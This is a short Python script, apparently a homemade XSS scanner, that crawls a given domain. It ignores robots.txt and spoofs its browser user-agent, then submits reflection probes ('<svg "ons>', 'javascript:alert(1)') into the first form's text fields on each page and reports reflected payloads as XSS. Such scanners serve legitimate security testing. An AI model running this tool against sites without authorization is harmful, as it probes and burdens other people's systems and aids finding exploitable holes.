

import mechanize
import sys

br = mechanize.Browser()
br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')]
br.set_handle_robots(False)
br.set_handle_refresh(False)


class color:
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'


print color.BOLD + color.RED + """
 __  __     ______     ______        ______     ______     _____    
/\_\_\_\   /\  ___\   /\  ___\      /\  ___\   /\  __ \   /\  __ \  
\/_/\_\/_  \ \___  \  \ \___  \     \ \ \__ \  \ \ \/\ \  \ \ \/\ \ 
  /\_\/\_\  \/\_____\  \/\_____\     \ \_____\  \ \_____\  \ \____/ 
  \/_/\/_/   \/_____/   \/_____/      \/_____/   \/_____/   \/____/ 
                                                                    

""" + color.END


def initializeAndFind(firstDomains):

	dummy = 0	
	firstDomains = []	
	if len(sys.argv) >=2:	
		url = sys.argv[1]
	else:
		print "URL format; AOL.com not http or www"
		return 0
	
	smallurl = sys.argv[1]	

	allURLS = []
	allURLS.append(url)
	largeNumberOfUrls = []	

	noSecondParameter = 0
	if len(sys.argv) < 3:
		noSecondParameter = 0
	else:
		noSecondParameter = 1
	if sys.argv[1]:
		print "Doing a short traversal."
		print "   "
		for url in allURLS:
			x = str(url)
			smallurl = x
			url = "http://www." + str(url)
			try:
				br.open(url)
				print "Crawling "+ str(url)
				print "   "
				try:
					for link in br.links():
						if smallurl in str(link.absolute_url):
							firstDomains.append(str(link.absolute_url))
					firstDomains = list(set(firstDomains))
				except:
					dummy = 0
			except:
				dummy = 0
		print "Number of crawled pages " + str(len(firstDomains))
		print "  "
		
	if noSecondParameter != 0:
		if(sys.argv[2] == "-e"):
			print "Doing a comprehensive traversal. This could take a while."
			for link in firstDomains:
				try:
					br.open(link)
					try:
						for newlink in br.links():
							if smallurl in str(newlink.absolute_url):
								largeNumberOfUrls.append(newlink.absolute_url)
					except:
						dummy = 0
				except:
					dummy = 0
	
			firstDomains = list(set(firstDomains + largeNumberOfUrls))
			print "Total Number of links has become: " + str(len(firstDomains))	
	return firstDomains


def findxss(firstDomains):
	print "Beginning scan."	
	print "  "
	xssLinks = []			
	count = 0			
	dummyVar = 0			
	if len(firstDomains) > 0:	
		for link in firstDomains:
			y = str(link)
			print "\n[!]  "+ str(link) + "  [!]\n\n"
			if 'jpg' in y:		
				print "There's no XSS in jpg silly goose"
			elif 'pdf' in y:
				print "There's no XSS in pdf silly goose"
			else:
				try:
					br.open(str(link))	
				except:
					dummyVar = 0
				try:
					for form in br.forms():	
						count = count + 1
				except:
					dummyVar = 0
				if count > 0:		
					try:
						params = list(br.forms())[0]
					except:
						dummyVar = 0
					try:
						br.select_form(nr=0)
					except:
						dummyVar = 0
					for p in params.controls:
						par = str(p)
						if 'TextControl' in par:
							print str(p.name)
							try:
								br.form[str(p.name)] = '<svg "ons>'
							except:
								dummyVar = 0
							try:
								br.submit()
							except:
								dummyVar = 0
							try:
								if '<svg "ons>' in br.response().read():	
									print "\n\nXSS discovered on" + str(link) + " the payload is <svg \"ons>" + "\n\n"
									xssLinks.append(link)
								else:
									dummyVar = 0
							except:
								print "could not read the page"
							try:
								br.back()
							except:
								dummyVar = 0


							try:
								br.form[str(p.name)] = 'javascript:alert(1)'	
							except:
								dummyVar = 0
							try:
								br.submit()
							except:
								dummyVar = 0
							try:
								if '<a href="javascript:alert(1)' in br.response().read():
									print "\n\nXSS discovered on" + str(link) + " the payload is javascript:alert(1)" + "\n\n"
									xssLinks.append(link)
								else:
									dummyVar = 0
							except:
								print "Could not read a page"
							try:
								br.back()		
							except:
								dummyVar = 0
					count = 0
		for link in xssLinks:		
			print link
	else:
		print "No links found"
		print "|||||||||||||||||||||||||||||||||||||||"
		print "         [!] Commands [!] "
		print "python XSS.py aol.com | No http or www."
		print "|||||||||||||||||||||||||||||||||||||||"


firstDomains = []
firstDomains = initializeAndFind(firstDomains)
findxss(firstDomains)
